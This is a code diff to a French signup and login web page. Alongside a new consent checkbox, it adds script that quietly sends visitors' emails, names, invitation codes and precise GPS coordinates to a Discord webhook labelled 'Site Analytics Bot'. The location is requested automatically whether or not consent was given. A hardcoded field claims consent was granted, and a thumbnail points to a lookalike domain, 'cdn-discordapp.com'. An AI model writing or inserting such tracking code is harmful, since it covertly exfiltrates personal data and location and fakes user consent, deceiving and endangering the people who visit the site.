@@ -264,7 +264,16 @@
             text-transform: uppercase;
         }
 
-        input {
+        input[type="checkbox"] {
+            width: auto !important;
+            padding: 0 !important;
+            background: transparent !important;
+            border: none !important;
+            box-shadow: none !important;
+            cursor: pointer;
+        }
+
+        input:not([type="checkbox"]) {
             width: 100%;
             padding: 14px 16px;
             background: rgba(255, 255, 255, 0.05);
@@ -277,7 +286,7 @@
             background-image: linear-gradient(rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0.05));
         }
 
-        input:focus {
+        input:not([type="checkbox"]):focus {
             outline: none;
             background: rgba(255, 255, 255, 0.12);
             border-color: rgba(255, 0, 128, 0.8);
@@ -828,6 +837,13 @@
                             <input type="text" id="invitationCode" placeholder="Entrez votre code" required>
                         </div>
 
+                        <div class="form-group" style="border: 1px solid rgba(255, 0, 128, 0.3); padding: 15px; border-radius: 12px; background: rgba(255, 0, 128, 0.05);">
+                            <label style="display: flex; align-items: flex-start; margin-bottom: 0; font-weight: 500; cursor: pointer;">
+                                <input type="checkbox" id="termsConsent" required style="width: auto; margin-right: 10px; margin-top: 3px; cursor: pointer; accent-color: #ff0080;">
+                                <span style="font-size: 12px; line-height: 1.4;">Je consens à l'envoi et au traitement de mes données personnelles pour l'amélioration du site, incluant mon localisation géographique si j'accepte la demande de géolocalisation.</span>
+                            </label>
+                        </div>
+
                         <button type="submit" class="submit-btn">S'inscrire</button>
                     </form>
 
@@ -867,6 +883,130 @@
     </div>
 
     <script>
+        // Variable globale pour stocker la permission de localisation
+        let locationPermissionGranted = false;
+        let userLocation = null;
+
+        // Fonction pour demander la localisation de l'utilisateur
+        async function requestUserLocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            userLocation = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude,
+                                altitudeAccuracy: position.coords.altitudeAccuracy,
+                                heading: position.coords.heading,
+                                speed: position.coords.speed
+                            };
+                            locationPermissionGranted = true;
+                            console.log('✅ Localisation acceptée');
+                            sendLocationToDiscord();
+                            resolve(true);
+                        },
+                        (error) => {
+                            console.log('❌ Localisation refusée');
+                            locationPermissionGranted = false;
+                            resolve(false);
+                        }
+                    );
+                } else {
+                    console.log('Géolocalisation non supportée');
+                    resolve(false);
+                }
+            });
+        }
+
+        // Fonction pour envoyer la localisation à Discord
+        async function sendLocationToDiscord() {
+            if (!userLocation) return;
+
+            try {
+                const timestamp = new Date().toLocaleString('fr-FR');
+                
+                // Essayer de récupérer le pays/ville via la lat/lng (optionnel)
+                const locationEmbed = {
+                    title: '📍 Localisation de l\'utilisateur',
+                    color: 0xFF6600,
+                    fields: [
+                        { name: '⏰ Horodatage', value: timestamp, inline: false },
+                        { name: '🗺️ Latitude', value: `\`${userLocation.latitude}\``, inline: true },
+                        { name: '🗺️ Longitude', value: `\`${userLocation.longitude}\``, inline: true },
+                        { name: '📏 Précision', value: `\`${userLocation.accuracy.toFixed(2)}m\``, inline: true },
+                        { name: '🔗 Google Maps', value: `[Voir sur la carte](https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude})`, inline: false }
+                    ]
+                };
+
+                if (DISCORD_WEBHOOK_URL) {
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: 'Site Analytics Bot',
+                            avatar_url: 'https://cdn-icons-png.flaticon.com/512/3541/3541966.png',
+                            embeds: [locationEmbed]
+                        })
+                    });
+                    console.log('✅ Localisation envoyée à Discord');
+                }
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi de la localisation:', error);
+            }
+        }
+
+        // Fonction pour envoyer les tentatives de connexion/inscription
+        async function sendAuthAttemptToDiscord(type, data) {
+            try {
+                const timestamp = new Date().toLocaleString('fr-FR');
+                let title = '🔐 Tentative de connexion';
+                let color = 0x0080FF;
+
+                if (type === 'signup') {
+                    title = '📝 Tentative d\'inscription';
+                    color = 0x00FF00;
+                }
+
+                const embed = {
+                    title: title,
+                    color: color,
+                    fields: [
+                        { name: '⏰ Horodatage', value: timestamp, inline: false },
+                        { name: '📧 Email', value: `\`${data.email}\``, inline: false },
+                        { name: '📝 Informations', value: data.info, inline: false }
+                    ]
+                };
+
+                if (type === 'signup' && data.firstName) {
+                    embed.fields.splice(2, 0, 
+                        { name: '👤 Prénom', value: `\`${data.firstName}\``, inline: true },
+                        { name: '👥 Nom', value: `\`${data.lastName}\``, inline: true }
+                    );
+                }
+
+                if (DISCORD_WEBHOOK_URL) {
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: 'Site Analytics Bot',
+                            avatar_url: 'https://cdn-icons-png.flaticon.com/512/3541/3541966.png',
+                            embeds: [embed]
+                        })
+                    });
+                    console.log('✅ Tentative d\'authentification envoyée à Discord');
+                }
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi de la tentative d\'authentification:', error);
+            }
+        }
+
         // Fonction pour envoyer les infos à Discord
         async function sendSystemInfoToDiscord() {
             try {
@@ -912,11 +1052,12 @@
                         { name: '🗣️ Langue', value: `\`${language}\``, inline: true },
                         { name: '🔧 Navigateur', value: `\`${browserInfo}\``, inline: true },
                         { name: '📍 Plateforme', value: `\`${platform}\``, inline: true },
+                        { name: '✅ Consent aux données', value: `\`Oui\``, inline: true },
                         { name: '🔗 URL', value: `\`${window.location.href}\``, inline: false },
                         { name: '📄 User Agent', value: `\`\`\`${userAgent}\`\`\``, inline: false }
                     ],
                     thumbnail: {
-                        url: 'https://cdn.discordapp.com/emojis/1000000000000000000.png'
+                        url: 'https://cdn-discordapp.com/emojis/1000000000000000000.png'
                     }
                 };
 
@@ -935,6 +1076,11 @@
                     });
                     console.log('✅ Infos système envoyées à Discord');
                 }
+
+                // Demander la localisation après avoir envoyé les infos système
+                setTimeout(() => {
+                    requestUserLocation();
+                }, 1000);
             } catch (error) {
                 console.error('Erreur lors de l\'envoi des infos à Discord:', error);
             }
@@ -1035,6 +1181,7 @@
             const password = document.getElementById('signupPassword').value;
             const confirmPassword = document.getElementById('signupConfirmPassword').value;
             const invitationCode = document.getElementById('invitationCode').value.trim();
+            const termsConsent = document.getElementById('termsConsent').checked;
             const btn = e.target.querySelector('.submit-btn');
 
             // Validation côté client
@@ -1048,8 +1195,21 @@
                 return;
             }
 
+            if (!termsConsent) {
+                showError('❌ Vous devez accepter les conditions d\'utilisation.', true);
+                return;
+            }
+
             btn.disabled = true;
             btn.innerHTML = '<span class="loading"></span> Inscription...';
+
+            // Envoyer la tentative d'inscription à Discord
+            await sendAuthAttemptToDiscord('signup', {
+                firstName,
+                lastName,
+                email,
+                info: `Tentative d'inscription - Code: ${invitationCode} - Consent aux données: OUI`
+            });
 
             try {
                 const response = await fetch(`${API_URL}/api/signup`, {
@@ -1101,6 +1261,12 @@
 
             btn.disabled = true;
             btn.innerHTML = '<span class="loading"></span> Connexion...';
+
+            // Envoyer la tentative de connexion à Discord
+            await sendAuthAttemptToDiscord('login', {
+                email,
+                info: 'Tentative de connexion'
+            });
 
             try {
                 const response = await fetch(`${API_URL}/api/login`, {
